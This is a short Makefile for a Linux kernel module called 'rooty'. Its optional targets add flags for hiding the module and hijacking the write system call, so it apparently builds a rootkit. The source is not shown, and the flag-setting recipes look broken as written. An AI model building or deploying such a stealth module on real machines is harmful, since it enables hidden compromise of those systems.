obj-m := rooty.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
OPTS = 

all:
	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)

invisible:
	$(OPTS) += -DINVISIBLE_MODULE

write:
	$(OPTS) += -DHIJACK_WRITE


clean:
	-rm -rf *.o *.ko *.symvers *.mod *.order

